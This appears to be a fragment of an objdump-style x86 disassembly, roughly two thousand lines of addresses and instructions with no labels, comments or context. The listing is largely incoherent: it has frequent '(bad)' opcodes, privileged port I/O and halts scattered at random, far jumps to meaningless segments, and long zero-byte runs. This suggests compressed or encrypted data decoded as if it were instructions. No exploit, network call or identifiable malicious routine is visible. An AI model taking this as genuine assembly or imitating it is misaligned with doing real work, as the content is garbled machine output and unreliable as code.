  44bc57:	and    al,0x24
  44bc59:	dec    edx
  44bc5a:	pop    ebx
  44bc5b:	dec    ecx
  44bc5c:	and    al,0xae
  44bc5e:	dec    ebx
  44bc5f:	test   eax,0x83fad2a
  44bc64:	sub    ebp,eax
  44bc66:	cmp    ah,cl
  44bc68:	sub    ebp,ecx
  44bc6a:	cmp    BYTE PTR [edx+ebp*1],bl
  44bc6d:	inc    esp
  44bc6e:	sub    DWORD PTR [ebx],esp
  44bc70:	sub    ecx,ebp
  44bc72:	mov    ds:0x93c90eb2,eax
  44bc77:	mov    dl,0xe
  44bc79:	fs sbb eax,0x3501d39
  44bc7f:	sub    ah,BYTE PTR [ebx]
  44bc81:	push   eax
  44bc82:	add    BYTE PTR [eax],al
  44bc84:	add    BYTE PTR [eax],al
  44bc86:	add    BYTE PTR [eax],al
  44bc88:	mov    bh,0x21
  44bc8a:	mov    ebp,0x3a227100
  44bc8f:	add    DWORD PTR [ebp+0x22],edx
  44bc92:	cld    
  44bc93:	std    
  44bc94:	xchg   esp,eax
  44bc95:	and    dh,dl
  44bc97:	cmc    
  44bc98:	stos   DWORD PTR es:[edi],eax
  44bc99:	pop    ds
  44bc9a:	iret   
  44bc9b:	out    dx,al
  44bc9c:	jmp    0x44bcbd
  44bc9e:	test   al,0xdb
  44bca0:	loope  0x44bcc8
  44bca2:	xor    cl,bl
  44bca4:	or     BYTE PTR [ebx],ch
  44bca6:	jp     0x44bc67
  44bca8:	clc    
  44bca9:	sub    ah,BYTE PTR [esi-0x48]
  44bcac:	sub    DWORD PTR [ebx],ebp
  44bcae:	jnp    0x44bc6f
  44bcb0:	sbb    DWORD PTR [ebx],ebp
  44bcb2:	je     0x44bc5b
  44bcb4:	push   eax
  44bcb5:	sub    eax,DWORD PTR [eax+0x2b379f]
  44bcbb:	(bad)  
  44bcbc:	jp     0x44bcab
  44bcbe:	cmp    al,0xd2
  44bcc0:	jp     0x44bcd1
  44bcc2:	cmp    eax,0x3d2f6b6b
  44bcc7:	xchg   BYTE PTR [ebx+0x6f],ch
  44bcca:	cmp    eax,0x3e046bb3
  44bccf:	bound  ebp,QWORD PTR [eax+0x22]
  44bcd2:	aas    
  44bcd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44bcd4:	imul   ebp,eax,0xef679ff
  44bcda:	add    BYTE PTR [ecx],bl
  44bcdc:	mov    dh,0xe
  44bcde:	add    BYTE PTR [ebp+0x64],ch
  44bce1:	xor    DWORD PTR [edx],0xffffffe0
  44bce4:	sub    DWORD PTR fs:0x355c634a,esi
  44bceb:	add    BYTE PTR [eax],al
  44bced:	add    BYTE PTR [eax],al
  44bcef:	add    BYTE PTR [ebp+0x61],al
  44bcf2:	mov    dl,0x37
  44bcf4:	(bad)  
  44bcf5:	pusha  
  44bcf6:	loope  0x44bd2f
  44bcf8:	mov    ebp,0x7338896d
  44bcfd:	ins    DWORD PTR es:[edi],dx
  44bcfe:	repz cmp BYTE PTR [edi],bh
  44bd01:	outs   dx,DWORD PTR ds:[esi]
  44bd02:	dec    ebx
  44bd03:	cmp    DWORD PTR [ebx+0x6a],ecx
  44bd06:	pop    edx
  44bd07:	cmp    eax,0x3fde6879
  44bd0c:	stc    
  44bd0d:	add    eax,0xb631000f
  44bd12:	push   cs
  44bd13:	add    ch,bh
  44bd15:	gs xor BYTE PTR es:0x89306366,bl
  44bd1d:	gs adc al,0x31
  44bd20:	and    eax,0x8334c67
  44bd25:	gs pop ebp
  44bd27:	xor    eax,DWORD PTR [eax+0x64]
  44bd2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44bd2b:	xor    edx,DWORD PTR [ebp-0x3acc0b9c]
  44bd31:	popa   
  44bd32:	add    al,0x34
  44bd34:	xchg   ebp,eax
  44bd35:	bound  ebx,QWORD PTR [eax+0x34]
  44bd38:	nop
  44bd39:	(bad)  
  44bd3a:	fidiv  WORD PTR [edi+0x5c]
  44bd3d:	pandn  mm3,QWORD PTR [edi-0x4121109c]
  44bd44:	pop    esp
  44bd45:	adc    eax,0x2ec4dcdf
  44bd4a:	fistp  WORD PTR ds:0x73f7fcbd
  44bd50:	(bad)  
  44bd53:	mov    bl,0x0
  44bd55:	add    BYTE PTR [eax],al
  44bd57:	add    BYTE PTR [eax],al
  44bd59:	mov    ebp,0xa6bcf84c
  44bd5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44bd5f:	stc    
  44bd60:	and    DWORD PTR [ecx-0x64e11c55],ebp
  44bd66:	loop   0x44bd4d
  44bd68:	fcomp  QWORD PTR [ebx-0x73f01fa9]
  44bd6e:	mov    eax,0x9a8528e6
  44bd73:	fbld   TBYTE PTR [ebp+edi*2+0x13]
  44bd77:	loopne 0x44bd34
  44bd79:	jne    0x44bdd1
  44bd7b:	loop   0x44bd07
  44bd7d:	outs   dx,BYTE PTR ds:[esi]
  44bd7e:	adc    esp,ebx
  44bd80:	inc    ebp
  44bd81:	addr16 and bl,0x76
  44bd85:	pop    edi
  44bd86:	int3   
  44bd87:	loope  0x44bd88
  44bd89:	pop    ss
  44bd8a:	pop    ebx
  44bd8b:	sub    al,0x0
  44bd8d:	nop
  44bd8e:	pop    edi
  44bd8f:	or     eax,0xdc829000
  44bd94:	aaa    
  44bd95:	shr    bl,0xe2
  44bd98:	test   eax,0xa8dd7ec0
  44bd9d:	mov    ds:0xa2f0dd03,al
  44bda2:	nop
  44bda3:	fisttp WORD PTR ds:0x8adf45a3
  44bda9:	mov    ds:0x83d8de10,eax
  44bdae:	mov    esp,0x5583f5dd
  44bdb3:	clc    
  44bdb4:	pop    ds
  44bdb5:	test   BYTE PTR [edx-0x599e0fe8],dh
  44bdbb:	jl     0x44bdac
  44bdbd:	add    BYTE PTR [eax],al
  44bdbf:	add    BYTE PTR [eax],al
  44bdc1:	add    al,ah
  44bdc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44bdc4:	lods   eax,DWORD PTR ds:[esi]
  44bdc5:	out    dx,eax
  44bdc6:	int    0xa5
  44bdc8:	mov    ecx,0xc2a5b0ef
  44bdcd:	out    dx,eax
  44bdce:	mov    ds:0xdaeedca5,eax
  44bdd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44bdd4:	dec    esp
  44bdd5:	out    dx,eax
  44bdd6:	dec    ebx
  44bdd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44bdd8:	repz in eax,dx
  44bdda:	xchg   ebx,eax
  44bddb:	test   al,0xd
  44bddd:	out    dx,al
  44bdde:	scas   eax,DWORD PTR es:[edi]
  44bddf:	test   al,0xda
  44bde1:	in     eax,dx
  44bde2:	mov    eax,ds:0xa3edc8a8
  44bde7:	test   al,0x36
  44bde9:	out    dx,al
  44bdea:	popf   
  44bdeb:	test   al,0x1c
  44bded:	out    dx,al
  44bdee:	(bad)  
  44bdef:	test   al,0x2d
  44bdf1:	out    dx,al
  44bdf2:	clc    
  44bdf3:	test   al,0xd1
  44bdf5:	in     al,dx
  44bdf6:	and    BYTE PTR [edi-0x587b1361],0x4f
  44bdfd:	in     al,dx
  44bdfe:	xchg   ebx,eax
  44bdff:	stos   BYTE PTR es:[edi],al
  44be00:	or     eax,0xb1aa6efc
  44be05:	sti    
  44be06:	mov    cl,0xaa
  44be08:	imul   edi,ebx,0xfffffff0
  44be0b:	stos   BYTE PTR es:[edi],al
  44be0c:	and    bh,bl
  44be0e:	lea    ebp,[ecx-0x5657053c]
  44be14:	adc    bl,bh
  44be16:	outs   dx,BYTE PTR ds:[esi]
  44be17:	test   eax,0xacaef9f6
  44be1c:	mov    ecx,0x94ac61f9
  44be21:	stc    
  44be22:	jp     0x44bdd0
  44be24:	data16 stc 
  44be26:	add    BYTE PTR [eax],al
  44be28:	add    BYTE PTR [eax],al
  44be2a:	add    BYTE PTR [edi],ch
  44be2c:	lods   eax,DWORD PTR ds:[esi]
  44be2d:	inc    ebx
  44be2e:	stc    
  44be2f:	imul   BYTE PTR [ebx+ecx*8+0xfabf9f8]
  44be36:	clc    
  44be37:	shr    DWORD PTR [ebx-0x4b400bf2],0x2a
  44be3e:	ffreep st(7)
  44be40:	(bad)  
  44be41:	sub    al,BYTE PTR [edi]
  44be43:	rcr    BYTE PTR [edx+ebp*1+0x2aaaa01b],0x3f
  44be4b:	mov    al,ds:0xa04f2ad9
  44be50:	sub    esp,DWORD PTR ds:[edi-0x60]
  44be54:	sbb    BYTE PTR [ebx],ch
  44be56:	ja     0x44bdd8
  44be58:	jno    0x44be85
  44be5a:	mov    ds:0x932b8280,al
  44be5f:	sbb    BYTE PTR [edx+0x2b],0xa4
  44be63:	sub    BYTE PTR [ebx+0x2b],0xf5
  44be67:	pusha  
  44be68:	enter  0xcc29,0x60
  44be6c:	lahf   
  44be6d:	sub    DWORD PTR [esi],esp
  44be6f:	popa   
  44be70:	or     eax,0x16614f2a
  44be75:	sub    bh,BYTE PTR [edx]
  44be77:	inc    ecx
  44be78:	test   BYTE PTR [edx],ch
  44be7a:	jecxz  0x44bebd
  44be7c:	mov    edi,0xfe41d728
  44be81:	sub    al,bl
  44be83:	inc    ecx
  44be84:	dec    edx
  44be85:	sub    DWORD PTR [edx+eiz*1+0x224f297f],ecx
  44be8c:	mov    ebx,0x9e27
  44be91:	add    BYTE PTR [eax],al
  44be93:	add    BYTE PTR [edx],ah
  44be95:	std    
  44be96:	daa    
  44be97:	mov    ds:0x6827d522,al
  44be9c:	add    esp,DWORD PTR ds:0xb2c3e928
  44bea2:	push   cs
  44bea3:	sub    DWORD PTR [edx+esi*4-0x3b0396f2],edx
  44beaa:	sbb    eax,0x1d9ee4d3
  44beaf:	xlat   BYTE PTR ds:[ebx]
  44beb0:	fdiv   st(0),st
  44beb2:	sbb    eax,0x1e05e4ba
  44beb7:	add    BYTE PTR [esi],al
  44beb9:	data16 arpl WORD PTR [ecx],si
  44bebc:	inc    ebx
  44bebd:	gs xchg esp,eax
  44bebf:	xor    DWORD PTR [ebx+0x65],ebx
  44bec2:	sahf   
  44bec3:	xor    DWORD PTR [ebp+eiz*2-0x56],ebp
  44bec7:	xor    ebp,esi
  44bec9:	gs ret 0xc131
  44becd:	gs cli 
  44becf:	xor    DWORD PTR [ebp+eiz*2+0x649b31eb],edi
  44bed6:	add    dh,BYTE PTR [edx]
  44bed8:	xchg   BYTE PTR [eax+0x32],ch
  44bedb:	xor    cl,BYTE PTR [edx-0x4bcdda98]
  44bee1:	fs pop eax
  44bee3:	xor    cl,BYTE PTR [esi-0x64cd939c]
  44bee9:	fs pusha 
  44beeb:	xor    cl,BYTE PTR [edi-0x18cd6c9c]
  44bef1:	xor    DWORD PTR [bp+si],0xffffffca
  44bef5:	addr16 mov ebx,0x32
  44befb:	add    BYTE PTR [eax],al
  44befd:	int    0x67
  44beff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44bf00:	xor    al,BYTE PTR [ebx]
  44bf02:	push   0x682332bf
  44bf07:	out    dx,eax
  44bf08:	xor    dl,BYTE PTR [esi]
  44bf0a:	push   0x652932e7
  44bf0f:	adc    BYTE PTR [ebx],dh
  44bf11:	aas    
  44bf12:	gs pop es
  44bf14:	xor    ebx,DWORD PTR [ebx+0x1e333765]
  44bf1a:	gs dec edi
  44bf1c:	xor    esp,ecx
  44bf1e:	fs pop eax
  44bf20:	xor    esi,DWORD PTR [ebx]
  44bf22:	gs dec eax
  44bf24:	xor    edx,eax
  44bf26:	fs js  0x44bf5c
  44bf29:	cs imul esi,DWORD PTR gs:[ebx],0x3394647f
  44bf31:	inc    ebp
  44bf32:	shl    BYTE PTR fs:[ebx],cl
  44bf35:	nop
  44bf36:	pop    ecx
  44bf37:	loopne 0x44bf25
  44bf39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44bf3a:	push   eax
  44bf3b:	out    0xd,al
  44bf3d:	sahf   
  44bf3e:	sub    esi,esp
  44bf40:	inc    ebx
  44bf41:	xchg   BYTE PTR [edx],dl
  44bf43:	out    0x6c,al
  44bf45:	jle    0x44bf1c
  44bf47:	in     eax,0x9a
  44bf49:	xchg   BYTE PTR [edi+0x217ebbe5],ch
  44bf4f:	in     eax,0xeb
  44bf51:	data16 (bad) 
  44bf53:	hlt    
  44bf54:	punpckhbw mm1,mm3
  44bf57:	cli    
  44bf58:	pop    ss
  44bf59:	pop    edx
  44bf5a:	fdivr  st,st(0)
  44bf5c:	xchg   DWORD PTR [ebx-0x7f],ebx
  44bf5f:	cli    
  44bf60:	jmp    0xcc00:0x0
  44bf67:	sbb    bl,ch
  44bf69:	inc    DWORD PTR [edi-0x6ffef3a5]
  44bf6f:	jg     0x44bf7d
  44bf71:	add    BYTE PTR [eax-0x562e1f2a],dl
  44bf77:	jb     0x44bf6d
  44bf79:	icebp  
  44bf7a:	stos   BYTE PTR es:[edi],al
  44bf7b:	inc    edx
  44bf7c:	stc    
  44bf7d:	cmp    ebx,DWORD PTR [esp+ecx*8-0x2a686d22]
  44bf84:	(bad)  
  44bf86:	dec    edi
  44bf87:	pop    ebx
  44bf88:	cld    
  44bf89:	add    BYTE PTR [eax-0x6ffff371],dl
  44bf8f:	repz loopne 0x44bf38
  44bf92:	cmp    ah,0xe0
  44bf95:	mov    DWORD PTR [esi+0xa],esp
  44bf98:	stc    
  44bf99:	popa   
  44bf9a:	imul   ebx,DWORD PTR [ebx-0x14],0x0
  44bf9e:	nop
  44bf9f:	mov    bl,0xb
  44bfa1:	add    BYTE PTR [eax-0x3cfb22d7],dl
  44bfa7:	retf   
  44bfa8:	loope  0x44bfc6
  44bfaa:	mov    esp,0xc4ace07e
  44bfaf:	push   edx
  44bfb0:	loope  0x44c012
  44bfb2:	mov    ebp,0x94f743b2
  44bfb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44bfb8:	jle    0x44bfb3
  44bfba:	xlat   BYTE PTR ds:[ebx]
  44bfbb:	mov    ds:0xa4fdf974,eax
  44bfc0:	add    edi,ecx
  44bfc2:	inc    esp
  44bfc3:	stos   BYTE PTR es:[edi],al
  44bfc4:	dec    edx
  44bfc5:	in     al,dx
  44bfc6:	shr    BYTE PTR [ecx+0xec12],1
  44bfcc:	add    BYTE PTR [eax],al
  44bfce:	add    BYTE PTR [eax-0x77150555],dl
  44bfd4:	stos   DWORD PTR es:[edi],eax
  44bfd5:	retf   0xa0ea
  44bfd8:	stos   DWORD PTR es:[edi],eax
  44bfd9:	jmp    0x70ea:0xeaab88ea
  44bfe0:	stos   DWORD PTR es:[edi],eax
  44bfe1:	sbb    ch,bl
  44bfe3:	push   0x60eaeaab
  44bfe8:	stos   DWORD PTR es:[edi],eax
  44bfe9:	jmp    0xd0ea:0xeaa9c8ea
  44bff0:	test   eax,0xa9c8eb3a
  44bff5:	or     ch,bl
  44bff7:	loopne 0x44bfa2
  44bff9:	sub    ch,bl
  44bffb:	enter  0x2aa9,0xeb
  44bfff:	lock test eax,0xa9e8eb1a
  44c005:	jmp    0xc8ea:0xeaa9e0ea
  44c00c:	test   eax,0xaa10eaea
  44c011:	jp     0x44bffd
  44c013:	or     BYTE PTR [edx-0x55df15b6],ch
  44c019:	push   0xffffffea
  44c01b:	or     BYTE PTR [edx-0x560f1596],ch
  44c021:	call   0xe0ea:0x6aa9e8ea
  44c028:	test   eax,0xaa48ea6a
  44c02d:	push   0xffffffea
  44c02f:	shr    BYTE PTR [ecx+0x2c0e],1
  44c035:	add    BYTE PTR [eax],al
  44c037:	add    dl,ch
  44c039:	jp     0x44c061
  44c03b:	sbb    al,0xea
  44c03d:	and    BYTE PTR [esi],0x3c
  44c040:	cli    
  44c041:	mov    ah,BYTE PTR [esi]
  44c043:	cmp    al,0xfa
  44c045:	push   edx
  44c046:	es or  al,0xea
  44c049:	pop    edx
  44c04a:	es cld 
  44c04c:	jmp    0xba40e6b3
  44c051:	push   0x26
  44c053:	cld    
  44c054:	mov    ecx,0xadec24b2
  44c059:	mov    edx,0xc2a5dc24
  44c05e:	and    al,0xfc
  44c060:	mov    ecx,0xb9fc24ca
  44c065:	xchg   edx,eax
  44c066:	and    al,0xc
  44c068:	stos   BYTE PTR es:[edi],al
  44c069:	call   0x9425:0x1aaa8424
  44c070:	jp     0x44c094
  44c072:	and    eax,0x252a7a74
  44c077:	je     0x44c0e3
  44c079:	jb     0x44c0a0
  44c07b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44c07c:	push   0x7a
  44c07e:	and    eax,0x25827ab4
  44c083:	mov    ah,0x7a
  44c085:	mov    ah,BYTE PTR ds:0x25526ab4
  44c08b:	test   BYTE PTR [edx+0x5a],ch
  44c08e:	and    eax,0x25623a94
  44c093:	je     0x44c0cf
  44c095:	push   0x25
  44c097:	je     0x44c0c3
  44c099:	mov    dl,0x23
  44c09b:	in     al,0x0
  44c09d:	add    BYTE PTR [eax],al
  44c09f:	add    BYTE PTR [eax],al
  44c0a1:	sub    bh,BYTE PTR [edx-0x3dc50bdd]
  44c0a7:	and    esi,esp
  44c0a9:	cmp    cl,dl
  44c0ab:	and    esi,esp
  44c0ad:	sub    dl,BYTE PTR [edx-0x65d4fbdd]
  44c0b3:	and    eax,DWORD PTR [eax]
  44c0b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44c0b6:	push   edi
  44c0b7:	pop    ds
  44c0b8:	cmp    edi,esp
  44c0ba:	push   edi
  44c0bb:	daa    
  44c0bc:	cmp    eax,DWORD PTR [eax+ebx*2]
  44c0bf:	dec    edi
  44c0c0:	cmp    ebp,DWORD PTR [eax+ebx*2]
  44c0c3:	push   edi
  44c0c4:	cmp    esp,DWORD PTR [eax+ebx*2]
  44c0c7:	aas    
  44c0c8:	cmp    ebx,DWORD PTR [eax+ebx*2]
  44c0cb:	inc    edi
  44c0cc:	cmp    esp,DWORD PTR [eax+ebx*2]
  44c0cf:	outs   dx,DWORD PTR ds:[esi]
  44c0d0:	cmp    esp,ebx
  44c0d2:	pop    edx
  44c0d3:	(bad)  
  44c0d4:	ds mov ecx,0x45000f5e
  44c0da:	scas   eax,DWORD PTR es:[edi]
  44c0db:	push   cs
  44c0dc:	add    BYTE PTR [eax+0x5f],cl
  44c0df:	stos   BYTE PTR es:[edi],al
  44c0e0:	xor    edx,DWORD PTR [ebx+0x28346a5f]
  44c0e6:	arpl   WORD PTR [eax-0x489cdbcc],ax
  44c0ec:	xor    al,0x16
  44c0ee:	arpl   WORD PTR [esp+esi*1+0x34db6302],si
  44c0f5:	aaa    
  44c0f6:	(bad)  
  44c0f7:	leave  
  44c0f8:	xor    al,0x49
  44c0fa:	(bad)  
  44c0fb:	out    0x34,eax
  44c0fd:	imul   ebp,DWORD PTR [ebx+0x12],0x36b5d35
  44c104:	xor    eax,0x0
  44c109:	add    BYTE PTR [ebp+0x6b],bl
  44c10c:	xor    dh,BYTE PTR ds:0x35726b3c
  44c112:	test   DWORD PTR [ebx-0x6c],ebp
  44c115:	xor    eax,0x362e6061
  44c11a:	mov    ds:0xdb368060,al
  44c11f:	pop    edi
  44c120:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44c121:	ss mov ebp,0xaf373b5f
  44c127:	pusha  
  44c128:	mov    edi,0x65e2637
  44c12d:	cmp    BYTE PTR [esi],dh
  44c12f:	push   edi
  44c130:	cmp    edi,DWORD PTR [ecx]
  44c132:	nop
  44c133:	mov    ds:0x835a59fa,al
  44c138:	div    BYTE PTR [edx+0x20f554ca]
  44c13e:	retf   
  44c13f:	dec    edx
  44c140:	cmc    
  44c141:	push   esi
  44c142:	mov    ebx,0xbbbef502
  44c147:	lahf   
  44c148:	hlt    
  44c149:	and    DWORD PTR [edx+edx*2-0x6c5bb908],ebp
  44c150:	test   DWORD PTR ds:0x32f96e9d,0xcc5b97
  44c15a:	nop
  44c15b:	fisttp WORD PTR [ebx]
  44c15d:	add    BYTE PTR [eax-0x7fc723d4],dl
  44c163:	push   cs
  44c164:	fdiv   st(4),st
  44c166:	add    BYTE PTR [eax-0x1d],0x54
  44c16a:	popa   
  44c16b:	(bad)  
  44c16c:	fstp   TBYTE PTR [edx+0x0]
  44c16f:	add    BYTE PTR [eax],al
  44c171:	add    BYTE PTR [eax],al
  44c173:	popa   
  44c174:	in     al,0xdb
  44c176:	nop
  44c177:	popa   
  44c178:	(bad)  
  44c17a:	fsub   DWORD PTR [ecx-0x40]
  44c17d:	fdiv   QWORD PTR ds:0x55dd0cc2
  44c183:	ret    
  44c184:	fstp   st(5)
  44c186:	xchg   ebx,eax
  44c188:	popf   
  44c189:	fisttp WORD PTR [ebp+edi*4+0x5a]
  44c18d:	jecxz  0x44c1ad
  44c18f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44c190:	test   eax,0xb09f5fe1
  44c195:	loope  0x44c1fb
  44c197:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44c198:	(bad)  
  44c19a:	mov    bl,BYTE PTR [edi-0x784d1e13]
  44c1a0:	sbb    eax,0x70880fe2
  44c1a5:	hlt    
  44c1a6:	dec    edi
  44c1a7:	js     0x44c1a4
  44c1a9:	cli    
  44c1aa:	sbb    bh,BYTE PTR [ecx+0x52]
  44c1ad:	test   BYTE PTR [esi],0x6a
  44c1b0:	mov    dl,0x16
  44c1b2:	jmp    0xac01:0xea70acd0
  44c1b9:	(bad)  
  44c1ba:	lock sbb eax,0x81eed3a6
  44c1c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44c1c1:	int    0xee
  44c1c3:	xor    DWORD PTR [edi-0x592c10cc],esp
  44c1c9:	sub    ch,bh
  44c1cb:	call   0x83a8:0xadee13a8
  44c1d2:	in     eax,dx
  44c1d3:	push   gs
  44c1d5:	push   esp
  44c1d6:	out    dx,al
  44c1d7:	add    BYTE PTR [eax],al
  44c1d9:	add    BYTE PTR [eax],al
  44c1db:	add    BYTE PTR [edx],ah
  44c1dd:	test   al,0x29
  44c1df:	out    dx,al
  44c1e0:	out    0xa7,al
  44c1e2:	lahf   
  44c1e3:	in     al,dx
  44c1e4:	std    
  44c1e5:	test   al,0x51
  44c1e7:	in     eax,dx
  44c1e8:	loope  0x44c192
  44c1ea:	or     ch,ch
  44c1ec:	lods   al,BYTE PTR ds:[esi]
  44c1ed:	test   al,0xf5
  44c1ef:	rcl    DWORD PTR [eax-0x6ffc1e4e],cl
  44c1f5:	mov    dl,0xe1
  44c1f7:	repz pop eax
  44c1f9:	mov    ds:0xa228f424,al
  44c1fe:	je     0x44c1f3
  44c200:	call   0x5b383da6
  44c205:	mov    ds:0xa192f3c1,eax
  44c20a:	xor    edx,0xf2aaa25a
  44c210:	xchg   esi,eax
  44c211:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44c212:	fcomi  st,st(1)
  44c214:	fsub   QWORD PTR [ebx+edx*2-0x85ac60f]
  44c21b:	lock mov WORD PTR [ebx-0x5bd40ee2],fs
  44c222:	xor    eax,0x47
  44c225:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44c226:	enter  0xd9f7,0x9e
  44c22a:	add    edi,eax
  44c22c:	fstp   DWORD PTR [esi-0x25c7f4f2]
  44c232:	and    bh,bl
  44c234:	daa    
  44c235:	jmp    0x6323:0x841f2f22
  44c23c:	daa    
  44c23d:	mov    ah,0x21
  44c23f:	or     DWORD PTR [eax],eax
  44c241:	add    BYTE PTR [eax],al
  44c243:	add    BYTE PTR [eax],al
  44c245:	pop    ds
  44c246:	pushf  
  44c247:	and    DWORD PTR [edi-0x42de2dfa],ebx
  44c24d:	dec    BYTE PTR [edx+0x22]
  44c250:	jp     0x44c258
  44c252:	ja     0x44c276
  44c254:	inc    esp
  44c255:	(bad)  
  44c256:	imul   esp,DWORD PTR [edx],0xfffffffe
  44c259:	in     eax,0xa7
  44c25b:	and    BYTE PTR [edi-0x44df0c23],ch
  44c261:	in     eax,0xda
  44c263:	and    BYTE PTR [esi-0x23],bh
  44c266:	mov    ebx,db3
  44c269:	lds    edi,FWORD PTR [ecx+0x21]
  44c26c:	sbb    bh,BYTE PTR [ebp-0x3b0ddea6]
  44c272:	retf   0xc61f
  44c275:	mov    esp,0xa48e2002
  44c27a:	(bad)  
  44c27b:	pop    ds
  44c27c:	jle    0x44c221
  44c27e:	inc    esi
  44c27f:	and    BYTE PTR [edx-0x3ddf815d],ah
  44c285:	mov    ds:0x7c0726b2,eax
  44c28a:	fwait
  44c28b:	xor    esi,DWORD PTR es:[eax+edx*8+0x26]
  44c290:	cmp    al,0x6c
  44c292:	inc    esp
  44c293:	daa    
  44c294:	jl     0x44c2fa
  44c296:	je     0x44c2bf
  44c298:	nop
  44c299:	jl     0x44c307
  44c29b:	daa    
  44c29c:	lock je 0x44c25f
  44c29f:	and    eax,0x26016d25
  44c2a4:	add    DWORD PTR [ebp+0x2e],esp
  44c2a7:	es jno 0x44c2aa
  44c2aa:	add    BYTE PTR [eax],al
  44c2ac:	add    BYTE PTR [eax],al
  44c2ae:	cmp    eax,0xd7002640
  44c2b3:	push   ebp
  44c2b4:	mov    bl,0x39
  44c2b6:	test   DWORD PTR [ebp-0x5b],edx
  44c2b9:	cmp    ebp,esp
  44c2bb:	push   esp
  44c2bc:	xlat   BYTE PTR ds:[ebx]
  44c2bd:	cmp    DWORD PTR [eax],eax
  44c2bf:	push   ebp
  44c2c0:	sbb    edi,DWORD PTR [edx]
  44c2c2:	xchg   edi,eax
  44c2c3:	pop    eax
  44c2c4:	outs   dx,BYTE PTR ds:[esi]
  44c2c5:	cmp    bh,BYTE PTR [edx]
  44c2c7:	push   ebp
  44c2c8:	mov    ah,0x3a
  44c2ca:	fs pop eax
  44c2cc:	jmp    0x8d3d:0x355a203a
  44c2d3:	pop    ecx
  44c2d4:	dec    esp
  44c2d5:	cmp    eax,0x3d725a1b
  44c2da:	imul   ebx,DWORD PTR [ecx-0x6c],0x3d
  44c2de:	mov    al,0x59
  44c2e0:	mov    ebp,0x2d59b23d
  44c2e5:	ds cmc 
  44c2e7:	pop    ebx
  44c2e8:	je     0x44c329
  44c2ea:	xor    al,0x5b
  44c2ec:	call   0xf577cf0
  44c2f1:	add    cl,dl
  44c2f3:	mov    dl,0xe
  44c2f5:	add    BYTE PTR [ebp+ebx*2+0x5ce231c9],bl
  44c2fc:	or     esi,DWORD PTR [edx]
  44c2fe:	add    BYTE PTR [ebp+0x6d],bl
  44c301:	xor    ch,dh
  44c303:	pop    esp
  44c304:	repz xor dl,BYTE PTR [esi+0x4a33515f]
  44c30b:	pop    edi
  44c30c:	xchg   DWORD PTR [ebx],esi
  44c30e:	or     al,0x5d
  44c310:	mov    ds:0x33,eax
  44c315:	add    BYTE PTR [eax],al
  44c317:	arpl   WORD PTR [ebp-0x18],bx
  44c31a:	xor    ebp,DWORD PTR [ebp+0x56]
  44c31d:	std    
  44c31e:	xor    eax,DWORD PTR [esi-0x70cbcb9e]
  44c324:	bound  eax,QWORD PTR [eax+0x36]
  44c327:	adc    DWORD PTR [eax+ebp*8-0x1],esp
  44c32b:	imul   esp,DWORD PTR [edx],0x6f90000f
  44c331:	or     al,0x0
  44c333:	nop
  44c334:	push   cs
  44c335:	fsubrp st(4),st
  44c337:	mov    BYTE PTR [ebx],dl
  44c339:	sti    
  44c33a:	dec    ecx
  44c33b:	jnp    0x44c2fc
  44c33d:	test   DWORD PTR [edx-0x2b105f85],0xfdefd66c
  44c347:	fs xchg edx,eax
  44c349:	cmc    
  44c34a:	js     0x44c3a9
  44c34c:	inc    eax
  44c34d:	idiv   DWORD PTR [eax+0x2ef6ef55]
  44c353:	iret   
  44c354:	or     esi,ebp
  44c356:	inc    DWORD PTR [edi]
  44c358:	pop    esp
  44c359:	mov    WORD PTR [ecx],es
  44c35b:	nop
  44c35c:	jae    0x44c36a
  44c35e:	add    BYTE PTR [eax-0x5f7323d6],dl
  44c364:	ja     0x44c349
  44c366:	pusha  
  44c367:	mov    eax,ds:0xa5afe1f9
  44c36c:	std    
  44c36d:	fidiv  WORD PTR [edi-0x62]
  44c370:	rcr    esp,1
  44c372:	xchg   esp,eax
  44c373:	xchg   edi,eax
  44c375:	fmul   st(3),st
  44c377:	jg     0x44c328
  44c379:	fadd   QWORD PTR [edx]
  44c37b:	add    BYTE PTR [eax],al
  44c37d:	add    BYTE PTR [eax],al
  44c37f:	add    BYTE PTR [eax+0x56],bh
  44c382:	hlt    
  44c383:	and    DWORD PTR [eax+0x20],edi
  44c386:	hlt    
  44c387:	inc    ecx
  44c388:	push   0x6861f43e
  44c38d:	or     bl,bh
  44c38f:	jne    0x44c3e9
  44c391:	fdivr  st,st(2)
  44c393:	xchg   BYTE PTR [eax+0x39],bl
  44c396:	sti    
  44c397:	jmp    0x5dc9:0x78f408c8
  44c39e:	cli    
  44c39f:	or     edi,DWORD PTR [edx-0x4b4105b7]
  44c3a5:	jb     0x44c39e
  44c3a7:	stc    
  44c3a8:	lods   al,BYTE PTR ds:[esi]
  44c3a9:	fs icebp 
  44c3ab:	imul   esp,DWORD PTR [ebp-0x2418d04e],0xffffffa7
  44c3b2:	pop    ebx
  44c3b3:	out    0x7b,eax
  44c3b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44c3b6:	out    0xe8,al
  44c3b8:	sahf   
  44c3b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44c3ba:	test   eax,0xcfa576e8
  44c3bf:	call   0xe948699b
  44c3c4:	adc    DWORD PTR [ebp-0x5af61695],esp
  44c3ca:	push   ebp
  44c3cb:	jmp    0xe9ca68bf
  44c3d0:	push   ecx
  44c3d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44c3d2:	sbb    eax,0xf66517e9
  44c3d7:	xchg   ebx,eax
